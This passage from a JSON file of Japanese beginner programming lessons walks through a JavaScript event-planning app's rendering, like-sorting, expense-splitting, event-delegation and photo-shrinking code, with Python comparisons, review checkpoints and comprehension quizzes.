`a.localeCompare(b)` | 文字列の比較（`sorted(key=...)` で並べる） |\n| `arr.slice(0, 5)` | `arr[:5]` |\n| `innerHTML = 文字列` | （Python には無い。HTML の箱に文字列を流し込む、ブラウザだけの機能） |\n\n## 🔑 キーワード\n\n- **render（描画）**：状態から画面を作り直す処理\n- **テンプレートリテラル**：`` `...${式}...` `` の、値を埋め込める文字列\n- **innerHTML**：要素の中身を HTML の文字列で書き換えるプロパティ\n- **data 属性**：`data-tab=\"...\"` のように、HTML の要素に付けるメモ書き\n- **メソッドチェーン**：`.filter().sort().slice()` のように処理をつなげる書き方\n- **比較関数**：`sort` に渡す「どちらを先にするか」を決める関数\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ 画面が「S → 文字列 → innerHTML」の一方通行で作られていて、仕組みが単純で追いやすい\n- ✅ ユーザーが入力したタイトルやログは `esc()` を通している\n- ⚠️ `innerHTML` で毎回全部作り直すので、**入力中のフォームが消えてしまう** 問題がある。8 ページ目の `rerender` でその対策をしている\n- ⚠️ `fmtDate(m.date)` や `t.status` などは `esc()` を通していない。普通に使う分には問題ないが、データベースに直接おかしな値が書き込まれると、表示が崩れたり悪用されたりする余地がある\n- ⚠️ 日数の計算は端末の時計とタイムゾーンを使う。海外の端末では 1 日ずれることがある（日本で使う分には問題なし）\n\n## 🗣️ 30 秒で人に説明するなら\n\n「render は状態 S をもとに画面を全部作り直す関数で、今のタブに対応する VIEWS の関数が返す HTML の文字列を、main の箱に innerHTML で入れています。\nホームでは本番までの日数を日付の引き算で出したり、自分の未完了タスクを filter・sort・slice で 5 件取り出したりしています。\nタスク一覧は、進行中・未着手・完了の順、同じ状態なら締め切りが早い順に並べています。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "`S.tab` が \"ideas\" のとき、render() が呼ぶ画面の関数は？",
      "choices": [
       "VIEWS.home",
       "VIEWS.ideas",
       "何も呼ばない"
      ],
      "answer": 1,
      "explain": "VIEWS[S.tab] で、タブ名と同じ名前の関数を取り出します。"
     },
     {
      "question": "タスク一覧で、締め切りが無いタスクはどこに並ぶ？",
      "choices": [
       "同じ状態のタスクの中で一番後ろ",
       "一番先頭",
       "表示されない"
      ],
      "answer": 0,
      "explain": "締め切りが無いものは \"9\" として比べるので、日付より後になります。"
     },
     {
      "question": "`[].map(x => x).join(\"\") || \"なし\"` の結果は？",
      "choices": [
       "\"\"",
       "\"なし\"",
       "[]"
      ],
      "answer": 1,
      "explain": "空の配列を join すると空文字になり、空文字は偽なので || の右側が使われます。"
     }
    ]
   ],
   "id": "2026-11-17-popup2027-05-render-views"
  },
  {
   "title": "描画（2）― アイデアの「いいね」とお金の精算計算",
   "language": "JavaScript",
   "date": "2026-11-17",
   "level": 3,
   "series": "popup2027",
   "part": 6,
   "concepts": [
    "higher_order",
    "collections",
    "operators",
    "dom_ui"
   ],
   "lessons": [
    "20-javascript/05-array-methods",
    "20-javascript/03-arrays-objects",
    "10-python/04-lists-and-dicts"
   ],
   "summary": "いいねの多い順に並ぶアイデア一覧と、立て替えた支出から「誰がいくら払う・もらうか」を計算するお金の画面。",
   "body": "## 📄 解説するコード（251〜291 行目・抜粋）\n\n```javascript\n  ideas() {\n    const list = [...S.ideas].sort((a, b) => ((b.likes || []).length - (a.likes || []).length) || byNew(a, b));\n    return `\n    <form class=\"add\" data-form=\"ideas\">\n      <textarea class=\"grow\" name=\"text\" placeholder=\"思いついたこと、なんでも（写真だけでもOK）\">${esc(S.ideaDraft || \"\")}</textarea>\n      ${S.ideaPhoto ? `<div class=\"grow photo-prev\"><img src=\"${S.ideaPhoto}\" alt=\"\"><button type=\"button\" class=\"x\" data-act=\"clearPhoto\">×</button></div>` : \"\"}\n      <label class=\"btn ghost\">📷 写真<input type=\"file\" accept=\"image/*\" data-photo hidden></label>\n      <button class=\"btn\" ${S.busy ? \"disabled\" : \"\"}>${S.busy ? \"処理中…\" : \"投稿\"}</button>\n    </form>\n    <div class=\"list\">${list.map(i => { const likes = i.likes || []; return `\n      <div class=\"item\"><div class=\"body\">${i.text ? esc(i.text) : \"\"}${i.photo ? `<img class=\"photo\" src=\"${i.photo}\" alt=\"\" data-zoom=\"${i.id}\">` : \"\"}<div class=\"meta\">${esc(i.author)}</div></div>\n      <button class=\"like ${likes.includes(S.me) ? \"on\" : \"\"}\" data-like=\"${i.id}\" title=\"${esc(likes.join(\"、\"))}\">♥ ${likes.length}</button>\n      <button class=\"x\" data-del=\"ideas:${i.id}\">×</button></div>`; }).join(\"\") || `<div class=\"empty\">アイデアはまだありません</div>`}</div>`;\n  },\n\n  expenses() {\n    const members = S.settings.members;\n    const total = S.expenses.reduce((s, e) => s + (+e.amount || 0), 0);\n    const share = members.length ? total / members.length : 0;\n    const paid = Object.fromEntries(members.map(m => [m, 0]));\n    S.expenses.forEach(e => { if (e.paidBy in paid) paid[e.paidBy] += +e.amount || 0; });\n    const list = [...S.expenses].sort((a, b) => (b.date || \"\").localeCompare(a.date || \"\") || byNew(a, b));\n    return `\n    <form class=\"add\" data-form=\"expenses\"> ...（何に使った？・金額・立て替えた人・日付）... </form>\n    <div class=\"card\"><h2>合計 ${yen(total)}（1人あたり ${yen(share)}）</h2>\n      <table><tr><th>名前</th><th class=\"num\">立替</th><th class=\"num\">精算</th></tr>\n      ${members.map(m => { const d = paid[m] - share; return `<tr><td>${esc(m)}</td><td class=\"num\">${yen(paid[m])}</td>\n        <td class=\"num\" style=\"color:${d > 0.5 ? \"var(--ok)\" : d < -0.5 ? \"var(--accent)\" : \"var(--sub)\"}\">${d > 0.5 ? \"+\" + yen(d) + \" もらう\" : d < -0.5 ? yen(-d) + \" 払う\" : \"±0\"}</td></tr>`; }).join(\"\")}\n      </table></div>\n    <div class=\"list\"> ...（支出の一覧：日付の新しい順）... </div>`;\n  },\n```\n\n## 🧭 ひとことで言うと\n\n**JavaScript** で書かれた、**アイデア** と **お金** の 2 つの画面です。アイデアは「いいね」の多い順に並び、お金は立て替えた支出の記録から **「誰がいくら払えば・もらえば公平になるか」** を自動で計算します。\n\n## 🗺️ 全体の流れ\n\n**アイデア**\n1. いいねの多い順、同じなら新しい順に並べる\n2. 投稿フォーム（文字・写真）と、投稿の一覧を作る\n3. 自分がいいね済みなら ♥ ボタンに色を付ける\n\n**お金**\n1. 支出の合計を出す\n2. 合計をメンバーの人数で割って、1 人あたりの負担額を出す\n3. メンバーごとに、立て替えた金額を集計する\n4. 「立て替えた金額 − 1 人あたり」で、もらう人・払う人を決めて表にする\n\n## 🔍 ブロックごとの解説\n\n### いいねの仕組み：名前の配列\n\n```javascript\nconst likes = i.likes || [];\nlikes.includes(S.me)   // 自分がいいね済みか\nlikes.length           // いいねの数\n```\n\nいいねは「数」ではなく **いいねした人の名前の配列**（例：`[\"メンバーA\", \"メンバーC\"]`）で持っています。\nそのおかげで、**同じ人が 2 回いいねできない**・**誰がいいねしたか分かる**（ボタンにマウスを乗せると `title` に名前が出る）という 2 つのことが実現できています。\n\n### いいねの多い順に並べる\n\n```javascript\n[...S.ideas].sort((a, b) => ((b.likes || []).length - (a.likes || []).length) || byNew(a, b))\n```\n\n- `[...S.ideas]`：元の配列を **コピーしてから** 並べ替える（`sort` は元の配列を書き換えてしまうため）\n- `b - a` の順なので **多い順**。同じ数なら（0 になって）`byNew` で新しい順\n\n### 写真の下書き\n\n`S.ideaPhoto` に写真が入っていればプレビューを表示し、`S.busy`（写真の縮小中）なら投稿ボタンを押せなくします。写真の縮小は 8 ページ目です。\n\n### お金：精算の計算\n\n例で追ってみます。メンバーは A・B・C の 3 人、A が 9,000 円、B が 3,000 円を立て替えたとします。\n\n```javascript\nconst total = S.expenses.reduce((s, e) => s + (+e.amount || 0), 0);   // 12000\nconst share = members.length ? total / members.length : 0;             // 4000\nconst paid = Object.fromEntries(members.map(m => [m, 0]));             // {A: 0, B: 0, C: 0}\nS.expenses.forEach(e => { if (e.paidBy in paid) paid[e.paidBy] += +e.amount || 0; });\n                                                                        // {A: 9000, B: 3000, C: 0}\n```\n\n| 名前 | 立替 `paid[m]` | `d = paid[m] - share` | 表示 |\n|---|---|---|---|\n| A | 9,000 | +5,000 | **+¥5,000 もらう** |\n| B | 3,000 | −1,000 | **¥1,000 払う** |\n| C | 0 | −4,000 | **¥4,000 払う** |\n\nB と C が払う合計（5,000）と、A がもらう額（5,000）が一致していて、全員の負担がちょうど 4,000 円ずつになります。\n\n### 読み解きのポイント\n\n- `reduce((s, e) => s + ..., 0)`：0 から始めて、支出を 1 件ずつ足していく（JavaScript コースの「map・filter・reduce」）\n- `+e.amount || 0`：`+` で文字列を数値にし、数値にできなければ（NaN は偽）0 にする\n- `Object.fromEntries([[A, 0], [B, 0]])`：`{A: 0, B: 0}` を作る。Python の `dict(...)` にあたる\n- `if (e.paidBy in paid)`：今のメンバーにいない名前（名前を変える前の古い記録など）は集計しない\n- `d > 0.5` / `d < -0.5`：割り算の端数（3,333.33… 円など）で「±0」が「1 円払う」にならないよう、**0.5 円の幅を持たせて** 判定している\n\n### 三項演算子の連続\n\n```javascript\nd > 0.5 ? \"+\" + yen(d) + \" もらう\" : d < -0.5 ? yen(-d) + \" 払う\" : \"±0\"\n```\n\n`条件1 ? A : 条件2 ? B : C` は、`if 条件1: A elif 条件2: B else: C` と同じです。\n\n## 🐍 Python と比べると\n\n```python\ntotal = sum(int(e[\"amount\"] or 0) for e in expenses)\nshare = total / len(members) if members else 0\npaid = {m: 0 for m in members}\nfor e in expenses:\n    if e[\"paidBy\"] in paid:\n        paid[e[\"paidBy\"]] += int(e[\"amount\"] or 0)\nfor m in members:\n    d = paid[m] - share\n    label = f\"+{d:,.0f} もらう\" if d > 0.5 else f\"{-d:,.0f} 払う\" if d < -0.5 else \"±0\"\n```\n\n| JavaScript | Python |\n|---|---|\n| `arr.reduce((s, e) => s + x, 0)` | `sum(x for e in arr)` |\n| `Object.fromEntries(members.map(m => [m, 0]))` | `{m: 0 for m in members}` |\n| `\"name\" in obj` | `\"name\" in dict` |\n| `[...arr].sort(...)` | `sorted(arr, key=...)`（元を変えない） |\n\n## 🔑 キーワード\n\n- **割り勘の精算**：全員の負担を同じにするための「払う・もらう」の計算\n- **reduce**：配列を 1 つの値にまとめるメソッド\n- **Object.fromEntries**：`[キー, 値]` の配列からオブジェクトを作る\n- **三項演算子**：`条件 ? A : B` の、短い if の書き方\n- **非破壊的な並べ替え**：`[...arr]` でコピーしてから並べ、元の配列を変えないこと\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ いいねを名前の配列で持つことで、二重いいねを防いでいる\n- ✅ 精算の判定に 0.5 円の幅を持たせて、割り切れない金額でも表示がおかしくならない\n- ⚠️ 写真（`i.photo`）は `esc()` を通さずに `src=\"...\"` に入れている。アプリが作った画像なら安全だが、データベースに直接おかしな文字列を書き込まれると、そこからプログラムを動かされる余地がある（ログインが無いので、Firestore のルールで書き込みを制限することが大事）\n- ⚠️ 支出は「全員で均等に割る」前提。「この支出は A と B だけで割る」はできない\n- ⚠️ メンバーの名前を変えると、変更前の名前で記録した支出は `in paid` に当たらず、集計から外れる（表の合計と立替の合計が合わなくなる）\n\n## 🗣️ 30 秒で人に説明するなら\n\n「アイデアの画面は、いいねした人の名前を配列で持っていて、その数が多い順に並べています。名前で持つので同じ人は 2 回いいねできません。\nお金の画面は、支出の合計をメンバー数で割って 1 人あたりを出し、各自が立て替えた金額との差がプラスならもらう、マイナスなら払う、と表示しています。端数で変な表示にならないよう 0.5 円の幅を持たせています。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "4 人のメンバーで、A が 8,000 円だけ立て替えた。B の表示は？",
      "choices": [
       "±0",
       "¥2,000 払う",
       "+¥2,000 もらう"
      ],
      "answer": 1,
      "explain": "1 人あたり 2,000 円。B は 0 円しか払っていないので 2,000 円払います（A は 6,000 円もらう）。"
     },
     {
      "question": "いいねを「数」ではなく「名前の配列」で持っている理由として正しいのは？",
      "choices": [
       "同じ人が 2 回いいねするのを防ぎ、誰がいいねしたかも分かるから",
       "数字はデータベースに保存できないから",
       "並べ替えができないから"
      ],
      "answer": 0,
      "explain": "likes.includes(S.me) で、自分がいいね済みかを判定できます。"
     },
     {
      "question": "`[...S.ideas].sort(...)` の `[...S.ideas]` は何のため？",
      "choices": [
       "アイデアを 2 倍に増やすため",
       "元の配列を書き換えないよう、コピーしてから並べ替えるため",
       "写真だけを取り出すため"
      ],
      "answer": 1,
      "explain": "sort は元の配列を並べ替えてしまうので、コピーに対して行っています。"
     }
    ]
   ],
   "id": "2026-11-17-popup2027-06-ideas-expenses"
  },
  {
   "title": "イベント処理 ― クリックと送信を 1 か所で受け止める仕組み",
   "language": "JavaScript",
   "date": "2026-11-17",
   "level": 3,
   "series": "popup2027",
   "part": 7,
   "concepts": [
    "dom_ui",
    "higher_order",
    "conditionals",
    "async"
   ],
   "lessons": [
    "20-javascript/06-dom-events",
    "20-javascript/04-functions-arrow",
    "20-javascript/02-control-flow",
    "20-javascript/07-promise-async"
   ],
   "summary": "画面全体のクリックと送信を document でまとめて受け止め、ボタンの data 属性を見て何をするか決める（イベント委任）。モーダルも担当。",
   "body": "## 📄 解説するコード（293〜360 行目・抜粋）\n\n```javascript\n// ---------- モーダル ----------\nfunction showWho() {\n  document.getElementById(\"modal\").innerHTML = `<div class=\"modal\"><div class=\"card\"><h2>あなたは誰？</h2>\n    <div class=\"who\">${S.settings.members.map(m => `<button data-me=\"${esc(m)}\">${esc(m)}</button>`).join(\"\")}</div>\n    <p class=\"mini\">この端末に記憶されます。右上からいつでも変更できます。</p></div></div>`;\n}\nfunction showSettings() { /* タイトル・本番の日付・メンバー名を入力するフォームを出す */ }\nconst closeModal = () => document.getElementById(\"modal\").innerHTML = \"\";\n\n// ---------- イベント ----------\ndocument.addEventListener(\"click\", e => {\n  const z = e.target.closest(\"[data-zoom]\");\n  if (z) { document.getElementById(\"modal\").innerHTML = `<div class=\"modal lightbox\" data-act=\"close\"><img src=\"${z.src}\" alt=\"\"></div>`; return; }\n  if (e.target.closest(\".lightbox\")) return closeModal();\n  const t = e.target.closest(\"button,input[type=checkbox]\"); if (!t) return;\n  const d = t.dataset;\n  if (d.tab) { S.tab = d.tab; lsSet(\"pu-tab\", d.tab); render(); scrollTo(0, 0); }\n  else if (t.id === \"meBtn\") showWho();\n  else if (d.me) { S.me = d.me; lsSet(\"pu-me\", d.me); closeModal(); render(); }\n  else if (d.act === \"settings\") showSettings();\n  else if (d.act === \"close\") closeModal();\n  else if (d.act === \"clearPhoto\") { S.ideaPhoto = null; render(); }\n  else if (d.filter) { S.filter = d.filter; render(); }\n  else if (d.cycle) { const x = S.tasks.find(k => k.id === d.cycle); if (x) store.update(\"tasks\", x.id, { status: { todo: \"doing\", doing: \"done\", done: \"todo\" }[x.status] || \"todo\" }); }\n  else if (d.toggle) { const x = S.milestones.find(k => k.id === d.toggle); if (x) store.update(\"milestones\", x.id, { done: !x.done }); }\n  else if (d.like) {\n    if (!S.me) return showWho();\n    const x = S.ideas.find(k => k.id === d.like); if (!x) return;\n    const likes = x.likes || [];\n    store.update(\"ideas\", x.id, { likes: likes.includes(S.me) ? likes.filter(n => n !== S.me) : [...likes, S.me] });\n  }\n  else if (d.del) { const [col, id] = d.del.split(\":\"); if (confirm(\"削除しますか？\")) store.remove(col, id); }\n});\n\ndocument.addEventListener(\"submit\", e => {\n  const f = e.target.closest(\"form[data-form]\"); if (!f) return;\n  e.preventDefault();\n  const v = Object.fromEntries(new FormData(f));\n  const col = f.dataset.form;\n  if (col === \"settings\") { /* 設定を保存して閉じる */ return; }\n  if (!S.me) return showWho();\n  const author = S.me;\n  if (col === \"tasks\") store.add(col, { title: v.title.trim(), assignee: v.assignee, due: v.due, status: \"todo\", author });\n  if (col === \"milestones\") store.add(col, { title: v.title.trim(), date: v.date, done: false, author });\n  if (col === \"logs\") store.add(col, { text: v.text.trim(), date: v.date || today(), author });\n  if (col === \"ideas\") { /* 文字か写真が必要。失敗したら alert */ }\n  if (col === \"expenses\") store.add(col, { item: v.item.trim(), amount: +v.amount, paidBy: v.paidBy, date: v.date || today(), author });\n  pending = false; render();\n});\n```\n\n## 🧭 ひとことで言うと\n\n**JavaScript** で書かれた、**ボタンを押した・フォームを送信した、という操作（イベント）を受け止めて、データを変える** 部分です。ボタン 1 つ 1 つに処理を付けるのではなく、**ページ全体で 1 か所だけ** 受け止めているのが特徴です。\n\n## 🗺️ 全体の流れ\n\n**クリックされたとき**\n1. ページ全体（`document`）でクリックを受け取る\n2. 押された場所から一番近いボタンを探す（`closest`）\n3. ボタンの data 属性（`data-tab`・`data-cycle` など）を見て、何をするか決める\n4. 画面の切り替えなら `S` を変えて `render()`、データの変更なら `store.update` などを呼ぶ\n\n**フォームが送信されたとき**\n1. ページの再読み込みを止める（`preventDefault`）\n2. フォームの入力値をまとめて取り出す\n3. `data-form` の値（tasks など）に応じて `store.add` で保存する\n\n## 🔍 ブロックごとの解説\n\n### イベント委任：1 か所でまとめて受け止める\n\n```javascript\ndocument.addEventListener(\"click\", e => { ... });\n```\n\nこのアプリは `render()` のたびに画面を作り直すので、ボタンも毎回新しくなります。ボタンごとに処理を付けると、描き直すたびに付け直しが必要です。\nそこで、**ページ全体（document）に 1 つだけ** 処理を付け、クリックが「泡のように上に伝わってくる」性質（バブリング）を利用して受け止めています。これを **イベント委任** と呼びます。\n\n### closest と dataset：何が押されたかを知る\n\n```javascript\nconst t = e.target.closest(\"button,input[type=checkbox]\");\nconst d = t.dataset;\n```\n\n- `e.target`：実際にクリックされた要素（ボタンの中のアイコンの場合もある）\n- `closest(...)`：そこから外側へたどって、一番近いボタン（かチェックボックス）を探す\n- `dataset`：`data-tab=\"tasks\"` のような data 属性を `d.tab` で読めるようにしたもの\n\n5 ページ目で描いたボタンには、それぞれ data 属性が付いていました。\n\n| data 属性 | 押したときにすること |\n|---|---|\n| `data-tab` | タブを切り替える（最後のタブとして端末に記憶） |\n| `data-me` | 「あなたは誰？」で名前を選ぶ |\n| `data-act` | 設定を開く・閉じる・写真を取り消す |\n| `data-filter` | タスクを担当者で絞り込む |\n| `data-cycle` | タスクの状態を 未着手 → 進行中 → 完了 → 未着手 と回す |\n| `data-toggle` | 予定の完了チェック |\n| `data-like` | いいねを付ける・外す |\n| `data-del` | 確認してから削除（`\"tasks:abc123\"` を `:` で分けて種類と ID を取り出す） |\n\n### 状態を回す：対応表を使ったトリック\n\n```javascript\n{ todo: \"doing\", doing: \"done\", done: \"todo\" }[x.status] || \"todo\"\n```\n\n「今が todo なら次は doing」という **対応表をその場で作って、今の状態で引く** 書き方です。if を 3 つ並べるより短く書けます。\n\n### いいねの付け外し\n\n```javascript\nlikes.includes(S.me) ? likes.filter(n => n !== S.me) : [...likes, S.me]\n```\n\n自分の名前が入っていれば取り除き（いいね解除）、入っていなければ末尾に足す（いいね）。どちらも **新しい配列を作って** 保存しています。\n\n### フォームの送信\n\n```javascript\ne.preventDefault();\nconst v = Object.fromEntries(new FormData(f));\n```\n\n- `preventDefault()`：フォームを送信すると、普通はページが再読み込みされる。それを止めて JavaScript で処理する\n- `new FormData(f)`：フォームの入力欄を `name` ごとに集める\n- `Object.fromEntries(...)`：`{ title: \"会場を探す\", assignee: \"メンバーA\", due: \"2027-01-10\" }` のようなオブジェクトにする\n\n`<input name=\"title\">` の `name` が、そのまま `v.title` の名前になります。\n\n### 名前を選んでいないと書き込めない\n\n```javascript\nif (!S.me) return showWho();\nconst author = S.me;\n```\n\n誰が書いたかを `author` として一緒に保存するため、名前が未選択なら先に「あなたは誰？」を出します。\n\n### 変更したあと、画面はいつ変わる？\n\n`store.update(...)` を呼んでも、ここでは `render()` を呼んでいません（タブの切り替えなどは除く）。\n**データが変わると Firebase から知らせが届き、そこで描き直される** からです（3 ページ目の `onSnapshot`、8 ページ目の購読）。データの流れが一方通行になっているので、自分の変更も他の人の変更も、同じ道を通って画面に反映されます。\n\n## 🐍 Python と比べると\n\n| JavaScript | Python で言うと |\n|---|---|\n| `document.addEventListener(\"click\", e => ...)` | （ブラウザ専用）「クリックされたらこの関数を呼んで」と登録する |\n| `if (d.tab) ... else if (d.me) ...` | `if d.get(\"tab\"): ... elif d.get(\"me\"): ...` |\n| `{todo: \"doing\", ...}[x.status] \\|\\| \"todo\"` | `{\"todo\": \"doing\", ...}.get(x[\"status\"], \"todo\")` |\n| `const [col, id] = d.del.split(\":\")` | `col, id = d[\"del\"].split(\":\")` |\n| `confirm(\"削除しますか？\")` | `input(\"削除しますか？ (y/n) \") == \"y\"` |\n\n## 🔑 キーワード\n\n- **イベント**：クリック・送信・入力など、利用者の操作\n- **イベント委任**：親の要素（ここでは document）でまとめてイベントを受け止める方法\n- **バブリング**：イベントが内側の要素から外側へ伝わっていく性質\n- **closest**：外側へたどって、条件に合う一番近い要素を探すメソッド\n- **dataset / data 属性**：HTML 要素に付けたメモ書きを、JavaScript から読む仕組み\n- **モーダル**：画面の上に重ねて出す小窓\n- **FormData**：フォームの入力値をまとめて取り出す仕組み\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ イベント委任で、画面を作り直してもボタンの処理が消えない\n- ✅ 削除の前に確認を出している\n- ✅ 名前が未選択なら書き込む前に選ばせる\n- ⚠️ アイデア以外の保存（`store.add` / `update` / `remove`）は **失敗しても何も表示されない**。通信が切れていると、追加したつもりのタスクが消えたように見えることがある（Firestore はオフラインでも一時的に覚えておき、つながったら送る機能があるので、多くの場合は後で反映される）\n- ⚠️ 写真を拡大表示するとき `z.src` をそのまま HTML に入れている（6 ページ目と同じ注意点）\n- ⚠️ 長い `if / else if` の連続。機能が増えるとさらに長くなるので、data 属性ごとの処理を対応表（オブジェクト）にまとめる書き方もある\n\n## 🗣️ 30 秒で人に説明するなら\n\n「イベント処理は、ページ全体で 1 つだけクリックと送信を受け止める『イベント委任』で作っています。押されたボタンの data 属性、たとえば data-cycle や data-like を見て、タスクの状態を回したり、いいねを付け外ししたりしています。\nフォームは FormData で入力値をまとめて取り出して保存します。保存したあとはここでは描き直さず、データベースから届く変更の知らせで画面が更新される仕組みです。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "状態が「進行中（doing）」のタスクのボタンを押すと、次は？",
      "choices": [
       "未着手",
       "完了",
       "削除される"
      ],
      "answer": 1,
      "explain": "対応表 { todo: \"doing\", doing: \"done\", done: \"todo\" } で次の状態を引きます。"
     },
     {
      "question": "ボタンごとではなく document でクリックを受け止めている主な理由は？",
      "choices": [
       "render() で画面を作り直してもボタンの処理が消えないから",
       "そうしないとクリックできないから",
       "処理が速くなるから"
      ],
      "answer": 0,
      "explain": "ボタンは描き直すたびに新しくなるので、親でまとめて受け止める方が確実です。"
     },
     {
      "question": "フォームの送信で `e.preventDefault()` をしないと？",
      "choices": [
       "入力値が取り出せない",
       "ページが再読み込みされてしまう",
       "データが 2 回保存される"
      ],
      "answer": 1,
      "explain": "フォームの標準の動き（再読み込み）を止めて、JavaScript で処理しています。"
     }
    ]
   ],
   "id": "2026-11-17-popup2027-07-events"
  },
  {
   "title": "写真の縮小とリアルタイム更新 ― 入力中は描き直さない工夫",
   "language": "JavaScript",
   "date": "2026-11-17",
   "level": 4,
   "series": "popup2027",
   "part": 8,
   "concepts": [
    "async",
    "dom_ui",
    "data_formats",
    "errors",
    "database"
   ],
   "lessons": [
    "20-javascript/07-promise-async",
    "20-javascript/06-dom-events",
    "20-javascript/02-control-flow"
   ],
   "summary": "写真を 1MB の上限に収まるよう小さくして文字列にする処理と、データの変更を購読して画面を更新する（入力中は待つ）仕組み。",
   "body": "## 📄 解説するコード（362〜403 行目）\n\n```javascript\n// ---------- 写真 ----------\ndocument.addEventListener(\"input\", e => { if (e.target.matches('[data-form=\"ideas\"] textarea')) S.ideaDraft = e.target.value; });\ndocument.addEventListener(\"change\", async e => {\n  const inp = e.target.closest(\"[data-photo]\"); if (!inp || !inp.files[0]) return;\n  S.busy = true; render();\n  try { S.ideaPhoto = await shrink(inp.files[0]); }\n  catch { alert(\"この画像は読み込めませんでした\"); }\n  S.busy = false; render();\n});\n// 写真を縮小して JPEG の文字列にする（データベースの1件あたり上限 1MB に収める）\nasync function shrink(file) {\n  const url = URL.createObjectURL(file);\n  try {\n    const img = await new Promise((ok, ng) => { const i = new Image(); i.onload = () => ok(i); i.onerror = ng; i.src = url; });\n    let max = 1280, q = 0.78, out = \"\";\n    for (let n = 0; n < 6; n++) {\n      const r = Math.min(1, max / Math.max(img.naturalWidth, img.naturalHeight));\n      const c = document.createElement(\"canvas\");\n      c.width = Math.round(img.naturalWidth * r); c.height = Math.round(img.naturalHeight * r);\n      c.getContext(\"2d\").drawImage(img, 0, 0, c.width, c.height);\n      out = c.toDataURL(\"image/jpeg\", q);\n      if (out.length < 700000) return out;\n      max *= 0.8; q -= 0.08;\n    }\n    return out;\n  } finally { URL.revokeObjectURL(url); }\n}\n\n// ---------- 購読 ----------\nlet rendered = false;\nconst rerender = () => {\n  // 入力中のフォームは消さない\n  const a = document.activeElement;\n  if (rendered && a && a.closest(\"form\") && (a.value || \"\").length) return pending = true;\n  render(); rendered = true;\n};\nlet pending = false;\ndocument.addEventListener(\"focusout\", () => setTimeout(() => { if (pending && !document.activeElement?.closest(\"form\")) { pending = false; render(); } }, 0));\n\nstore.subSettings(s => { S.settings = { ...DEFAULT_SETTINGS, ...(s || {}) }; rerender(); if (!S.me || !S.settings.members.includes(S.me)) showWho(); });\nCOLS.forEach(c => store.sub(c, rows => { S[c] = rows; rerender(); }));\nrender();\n```\n\n## 🧭 ひとことで言うと\n\n**JavaScript** で書かれた、アプリの最後の部品です。前半は **写真をデータベースに入る大きさまで小さくする** 処理、後半は **データの変更を購読して画面を更新する**（ただし、文字を入力している最中は描き直さない）仕組みです。このシリーズで一番むずかしい部分なので、図を思い浮かべながら読みましょう。\n\n## 🗺️ 全体の流れ\n\n**写真を選んだとき**\n1. ファイル選択の変化（`change`）を受け取る\n2. 「処理中…」を表示（`S.busy = true`）\n3. `shrink()` で写真を縮小し、JPEG の **文字列** にして `S.ideaPhoto` に入れる\n4. 「処理中…」を消して描き直す（プレビューが出る）\n\n**アプリの起動時（購読の開始）**\n1. 設定と 5 種類のデータを購読する\n2. データが変わるたびに `S` に入れて `rerender()`\n3. `rerender()` は、誰かが文字を入力中なら描き直しを **保留** し、入力欄から離れたときにまとめて描き直す\n\n## 🔍 ブロックごとの解説\n\n### なぜ写真を小さくする？\n\nFirestore は **1 件のデータの大きさが最大 1MB** という決まりがあります。スマホの写真は数 MB あるので、そのままでは保存できません。\nこのアプリは写真を別の保存場所に置かず、**写真を文字列（Data URL）に変換して、アイデアのデータの中に直接入れる** 方式なので、小さくする必要があります。\n\n### shrink：少しずつ小さくして、入るまで試す\n\n```javascript\nlet max = 1280, q = 0.78, out = \"\";\nfor (let n = 0; n < 6; n++) {\n  ...\n  out = c.toDataURL(\"image/jpeg\", q);\n  if (out.length < 700000) return out;\n  max *= 0.8; q -= 0.08;\n}\n```\n\n1. 長い辺を最大 1280 ピクセル、画質 78% で JPEG にしてみる\n2. 文字列が 70 万文字より小さければ完成\n3. 大きすぎたら、サイズを 80% に、画質を 8% 下げて、もう一度（最大 6 回）\n\n| 回 | 長い辺の最大 | 画質 |\n|---|---|---|\n| 1 | 1280 | 0.78 |\n| 2 | 1024 | 0.70 |\n| 3 | 約 819 | 0.62 |\n| … | … | … |\n\n70 万文字にしているのは、1MB の上限に対して、文字（タイトルなど）の分の余裕を残すためです。\n\n### canvas：ブラウザの中の「お絵かき帳」\n\n```javascript\nconst c = document.createElement(\"canvas\");\nc.getContext(\"2d\").drawImage(img, 0, 0, c.width, c.height);\nout = c.toDataURL(\"image/jpeg\", q);\n```\n\n画面に見えない **お絵かき帳（canvas）** を作り、写真を小さいサイズで描き写して、それを JPEG の文字列として取り出しています。画像の縮小でよく使われる方法です。\n\n### 画像の読み込みを Promise にする\n\n```javascript\nconst img = await new Promise((ok, ng) => { const i = new Image(); i.onload = () => ok(i); i.onerror = ng; i.src = url; });\n```\n\n画像の読み込みは「終わったら onload を呼ぶ」という古い形（コールバック）です。それを `new Promise` で包んで、`await` で待てる形に変えています。\n\n- `ok`（resolve）：成功したら呼ぶ → `await` の結果が `i` になる\n- `ng`（reject）：失敗したら呼ぶ → 例外になり、呼び出し元の `catch` で「読み込めませんでした」と表示\n\n`URL.createObjectURL` で作った一時的な URL は、`finally` の `revokeObjectURL` で **必ず片付けて** います（メモリの節約）。\n\n### rerender：入力中は描き直さない\n\n`render()` は画面を丸ごと作り直すので、**文字を入力している最中に他のメンバーの変更が届くと、入力中の文字が消えてしまいます**。それを防ぐ工夫です。\n\n```javascript\nconst a = document.activeElement;\nif (rendered && a && a.closest(\"form\") && (a.value || \"\").length) return pending = true;\n```\n\n「今カーソルがあるのがフォームの中で、何か入力されている」なら、描き直さずに `pending = true`（あとで描き直す印）だけ付けて終わります。\n\n```javascript\ndocument.addEventListener(\"focusout\", () => setTimeout(() => {\n  if (pending && !document.activeElement?.closest(\"form\")) { pending = false; render(); }\n}, 0));\n```\n\n入力欄からカーソルが離れたとき（`focusout`）に、印が付いていれば描き直します。\n`setTimeout(..., 0)` は「今の処理が終わった直後に実行して」という意味で、**カーソルの移動先が確定してから** 調べるためのものです。\n\nアイデアの下書き（`S.ideaDraft`）は、入力のたびに `S` に保存しているので、描き直しても消えません。\n\n### 購読の開始：アプリが動き出す場所\n\n```javascript\nstore.subSettings(s => { S.settings = { ...DEFAULT_SETTINGS, ...(s || {}) }; rerender(); 